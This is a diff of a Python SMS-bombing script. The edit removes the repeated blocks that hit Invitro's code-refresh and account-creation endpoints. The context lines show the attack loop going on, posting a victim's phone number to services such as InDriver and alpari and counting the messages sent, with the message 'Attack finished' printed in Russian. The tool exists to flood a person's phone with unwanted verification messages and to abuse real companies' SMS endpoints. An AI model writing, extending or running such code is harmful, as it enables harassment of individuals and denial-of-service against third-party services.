@@ -994,17 +994,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -1101,18 +1091,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -1479,17 +1457,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -1590,18 +1558,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -1851,16 +1807,7 @@ if call == str(2):
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2970,17 +2917,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -3078,18 +3015,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -3456,17 +3381,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -3568,18 +3483,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -3833,16 +3736,7 @@ if call == str(2):
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -4964,17 +4858,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -5071,18 +4955,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -5449,17 +5321,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -5560,18 +5422,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -5821,16 +5671,7 @@ if call == str(2):
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -6944,17 +6785,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -7052,18 +6883,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -7430,17 +7249,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -7542,18 +7351,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -7817,16 +7614,7 @@ if call == str(2):
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -8930,17 +8718,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9037,18 +8815,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -9415,17 +9181,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -9526,18 +9282,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -9787,16 +9531,7 @@ if call == str(2):
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -10909,17 +10644,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11017,18 +10742,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -11395,17 +11108,7 @@ if call == str(2):
             time.sleep(2)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11507,18 +11210,6 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
-            time.sleep(2)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                          data={"password": password, "application": "lkp", "login": "+" + _phone})
-            R = R + 1
-            print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(2)
         except:
             print('[-] error in sent!')
@@ -11772,16 +11463,7 @@ if call == str(2):
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-            R = R + 1
-            print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
